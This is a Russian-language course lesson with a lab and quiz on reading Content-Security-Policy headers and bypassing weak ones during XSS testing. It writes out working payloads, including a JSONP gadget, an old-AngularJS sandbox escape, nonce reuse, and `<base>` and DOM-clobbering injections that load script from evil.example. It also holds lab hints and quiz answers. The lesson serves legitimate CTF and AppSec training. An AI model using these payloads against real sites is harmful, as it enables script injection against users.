---
id: web-csp-bypass
title: "CSP и его обход"
category: web
parent: web-xss-bypass-advanced
difficulty: medium
order: 1
tags: [csp, bypass, xss, nonce, jsonp, dom-clobbering]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как читать Content-Security-Policy, где он оставляет дыры и как обходить слабые политики до выполнения JS."
lab:
  kind: shell
  title: "Практика: обход CSP через script gadget (JSONP)"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Сними политику: curl -s -I https://forum.example/ | grep -i content-security-policy"
    - "В script-src есть доверенный домен — это потенциальный script gadget."
    - "На доверенном домене есть JSONP-эндпоинт: ?callback=... исполняет любую функцию."
    - "Загрузи его ответ: curl -s https://cdn.jsdelivr.net/jsonp?callback=x > found.txt"

---

## Вопрос, с которого всё начинается

Мы нашли XSS-инъекцию, но скрипт не выполняется. Почему? Очень часто виноват **CSP** (Content Security Policy) — заголовок, который говорит браузеру, откуда можно грузить скрипты, стили, картинки. Правильный CSP превращает «выполнил скрипт» в «скрипт не запустился».

Вопрос: значит ли это, что XSS «не эксплуатируется»? Нет — очень часто политика настроена так, что её **можно обойти**. Разберём, как читать CSP и находить в нём дыры, на одном примере.

## Наш пример

Есть сайт `forum.example`. Проверим его заголовки:

```bash
$ curl -s -I https://forum.example/ | grep -io 'content-security-policy:.*'
content-security-policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'nonce-abc123'; object-src 'none'
```

Прочитаем директивы. `default-src 'self'` — по умолчанию грузить только с того же домена. `script-src 'self' https://cdn.jsdelivr.net 'nonce-abc123'` — скрипты можно брать с самого сайта, с CDN `jsdelivr.net` и с элементов, помеченных `nonce="abc123"`. `object-src 'none'` — плагины запрещены.

Проверим, что инлайн-скрипт заблокирован:

```bash
$ curl -s 'https://forum.example/?q=<script>alert(1)</script>' -o /dev/null -w '%{http_code}\n'
200
```

Сервер вернул страницу с нашим `<script>`, но браузер его **не исполнит**: в консоли будет `Refused to execute inline script`. `'unsafe-inline'` в политике нет. Значит, прямой путь закрыт — но не тупик.

## Шаг 1: как читать CSP

Важные для XSS директивы:

| Директива | Что ограничивает |
|-----------|------------------|
| `script-src` | откуда можно грузить/выполнять JS |
| `default-src` | fallback для всего |
| `style-src` | CSS (иногда → утечка) |
| `connect-src` | куда можно `fetch`/`XHR`/`WebSocket` |
| `img-src` | откуда картинки (утечка через `src`) |
| `base-uri` | можно ли менять `<base>` |
| `object-src` | плагины (`<object>`) |

Ключевые «слабые» значения: `'unsafe-inline'` (разрешает инлайн-скрипты), `'unsafe-eval'` (`eval`, `Function`), `data:`/`*` в `script-src`, отсутствие `nonce`. Разложить политику по строкам удобно так:

```bash
$ curl -s -I https://forum.example/ | grep -io 'content-security-policy:.*' | tr ';' '\n'
```

## Шаг 2: ищем script gadget на доверенном домене

В нашей политике `script-src` содержит `https://cdn.jsdelivr.net`. **Каждый доверенный домен — потенциальный script gadget** — место, которое вернёт исполняемый JS по нашему запросу.

Если домен отдаёт **JSONP** (ответ в формате «вызови функцию с данными»), то `?callback=...` даёт выполнение произвольной функции:

```html
<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
```

Браузер доверяет домену из `script-src` → скрипт грузится и исполняется → CSP обойдён без `'unsafe-inline'`. Это историческая техника; сегодня нужно искать актуальные `callback`-эндпоинты на доменах из политики.

Второй вариант — **уязвимая библиотека** на доверенном CDN. Для `cdn.jsdelivr.net` можно загрузить старую AngularJS, где шаблон исполняется:

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.4.0/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
```

CSP доверяет CDN → библиотека грузится → Angular исполняет выражение. Доверенный домен снова стал нашим «входом».

## Шаг 3: проверяем nonce

`nonce` — одноразовый случайный токен; скрипт с правильным `nonce` политика пропускает. Идея в том, что подделать его нельзя. Но если сервер ставит **один и тот же** nonce на всех страницах (или берёт из cookie), найди его в HTML:

```html
<script nonce="d2FyZGVu">...</script>
```

И вставь свой скрипт с тем же nonce:

```html
<script nonce="d2FyZGVu">alert(1)</script>
```

CSP пропустит, потому что nonce «легитимен». Проверяется повторной загрузкой страницы: если nonce одинаков между запросами — он предсказуем.

## Шаг 4: `base-uri` не задан

В нашей политике **нет** `base-uri`. Это дыра: можно подсунуть свой базовый адрес и переписать относительные пути.

```html
<base href="https://evil.example/">
```

Теперь относительные `<script src="/js/app.js">` резолвятся относительно `evil.example`. Оговорка: `'self'` всё равно ограничит домен, поэтому техника особенно работает, когда в политике есть `*` или `https:` — тогда скрипты могут грузиться с любого домена, и `<base>` уводит их на твой. Всегда проверяй `base-uri`.

## Шаг 5: DOM clobbering — атака без JavaScript

Если `script-src` строг и JS-инъекция невозможна, но HTML-инъекция есть — можно **переопределить переменные доверенного скрипта** именованными элементами. Представь, что доверенный скрипт делает:

```javascript
var cfg = window.config || {};
loadScript(cfg.url);
```

Инъекция:

```html
<form id="config"><input name="url" value="https://evil.example/x.js"></form>
```

Теперь `window.config` — это HTML-форма, а `config.url` — наш input. Доверенный скрипт грузит наш URL. Это **DOM clobbering** — «загрязнение» глобальных имён элементами с `id`/`name`. Особенно эффективно против кода, который читает `window.X` без проверки типа.

## Шаг 6: таблица слабостей и обходов

| Слабое место CSP | Обход |
|------------------|-------|
| `'unsafe-inline'` | прямой `<script>`/`onerror=` |
| `'unsafe-eval'` | `eval`, `Function`, `setTimeout('...')` |
| `script-src *` / `https:` | любой внешний скрипт (JSONP/CDN) |
| доверенный CDN | script gadget / уязвимая библиотека |
| нет `base-uri` | `<base href="//evil.com">` |
| нет `object-src` | `<object data="data:text/html,...">` |
| nonce статичен | вставить свой `<script nonce=...>` |
| CSP в `<meta>` | не покрывает `frame-ancestors`, можно переопределить раньше |

## Шаг 7: строгий CSP и что остаётся

Современный сильный CSP: `script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'none'`. Обойти его сложно, но проверяй:

- **nonce утекает** в HTML, кешируется или повторяется — тогда переиспользуй;
- **`strict-dynamic`** доверяет скриптам, созданным доверенным скриптом — если есть gadget, он может создать твой;
- **Trusted Types** ломаются через DOM clobbering и `javascript:`-навигацию;
- **`style-src` без nonce** → CSS-инъекция для утечки (см. `web-css-injection`).

Если JS не проходит вообще — переходи к **CSS-эксфильтрации** и **dangling markup**: они не требуют исполнения скриптов.

## Шаг 8: где CSP обычно берётся

Полезно понимать, что CSP задаётся двумя способами. **Заголовком** `Content-Security-Policy` — это основной и полноценный вариант. И тегом **`<meta http-equiv="Content-Security-Policy">`** — он слабее: не покрывает `frame-ancestors`, применяется не ко всем ресурсам и, если стоит в начале документа, может быть переопределён позже. Кроме того, есть **`Content-Security-Policy-Report-Only`** — он **ничего не блокирует**, только сообщает о нарушениях на `report-uri`. Если видишь только Report-Only, значит политика не применяется, и XSS работает как обычно. Всегда проверяй, каким способом задан CSP и не ослаблен ли он `<meta>`.

## Что мы теперь знаем

- CSP ограничивает источники скриптов/стилей/запросов.
- `'unsafe-inline'`/`'unsafe-eval'` практически всегда = обход.
- Каждый доверенный домен в `script-src` — потенциальный **script gadget** (JSONP/библиотека).
- Статичный/повторяющийся `nonce` переиспользуется.
- Без `base-uri` работает `<base href>`; без `object-src` — `<object>`.
- **DOM clobbering** ломает доверенный скрипт через `id`/`name`.
- Если JS закрыт — CSS-эксфильтрация и dangling markup остаются.
- Артефакт — выполненный `alert(document.domain)` под этой политикой.

## На что смотреть дальше

- **Читай CSP перед выводами** — многие payload «не работают» именно из-за него.
- **`Content-Security-Policy-Report-Only` ничего не блокирует** — не путай с рабочим CSP.
- **Каждый домен в `script-src` — цель:** ищи на нём JSONP, уязвимые библиотеки, upload.
- **Проверь отсутствующие директивы:** `base-uri`, `object-src`, `connect-src`.
- **Собери политику в Google CSP Evaluator** — он подсветит слабые места.
- **Только с согласия** — payload сохраняется и срабатывает у жертв.

## Квиз

Проверь себя.

```quiz
- question: "Что делает директива `script-src`?"
  options:
    - "Ограничивает источники загружаемых скриптов"
    - "Задаёт cookie"
    - "Включает HTTPS"
    - "Разрешает CORS"
  answer: 0
  explanation: "`script-src` определяет, откуда можно выполнять JS."
- question: "Какое значение CSP фактически разрешает инлайн-скрипты?"
  options:
    - "`'none'`"
    - "`'unsafe-inline'`"
    - "`'strict-dynamic'`"
    - "`'self'`"
  answer: 1
  explanation: "`'unsafe-inline'` разрешает `<script>` и обработчики прямо в HTML."
- question: "Что такое script gadget?"
  options:
    - "Уязвимость в браузере"
    - "Доверенный домен из CSP, отдающий исполняемый JS (например JSONP)"
    - "Плагин Burp"
    - "Тип nonce"
  answer: 1
  explanation: "Если в `script-src` есть домен с JSONP/callback, через него исполняют JS."
- question: "Зачем нужна директива `base-uri`?"
  options:
    - "Запретить менять `<base>` и переписывать относительные пути"
    - "Разрешить `eval`"
    - "Ограничить формы"
    - "Задать nonce"
  answer: 0
  explanation: "Без неё можно подсунуть `<base href>` и увести загрузку ресурсов."
- question: "Чем отличается `Content-Security-Policy-Report-Only`?"
  options:
    - "Он блокирует ещё сильнее"
    - "Он ничего не блокирует, только сообщает о нарушениях"
    - "Он работает только для стилей"
    - "Он отключает TLS"
  answer: 1
  explanation: "Report-only не применяет политику, лишь логирует."
```

## Куда дальше

Дальше мы разберём ещё один «без-JS» класс — **client-side template injection**, где клиентский шаблонизатор исполняет наши выражения (`web-client-side-template-injection`). А пока главное запомни: CSP — это **препятствие, а не гарантия**, и каждая директива оставляет свою дыру.

## Где пригодится

- **CTF (Web):** задачи часто дают CSP, который надо обойти через JSONP/nonce/base-uri.
- **Bug bounty:** обход CSP превращает «неэксплуатируемый» XSS в полноценный — большая разница в выплате.
- **Пентест:** анализ CSP — часть оценки защищённости против XSS.
- **Работа (AppSec/Dev):** внедрение строгого CSP с nonce/hash — современный стандарт защиты от XSS.
